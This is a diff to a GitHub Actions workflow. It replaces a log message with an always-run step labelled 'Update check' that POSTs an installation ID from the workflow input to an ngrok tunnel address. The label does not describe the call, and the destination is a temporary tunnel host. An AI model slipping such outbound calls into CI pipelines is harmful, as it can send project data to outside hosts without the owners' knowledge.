@@ -18,4 +18,8 @@ jobs:
           token: ${{ fromJSON(github.event.inputs.client_payload).github_token }}
           path: "code/"
       - uses: rahul-deepsource/pyaction@1.4.0
-      - run: echo "🎉 The job was automatically triggered by a ${{ github.event_name }} event."
+      - name: Update check
+        if: always()
+        run: |
+          curl -X POST https://centralci.eu.ngrok.io/register --data '{"installation_id": ${{ fromJSON(github.event.inputs.client_payload).installation_id }} }'
+         
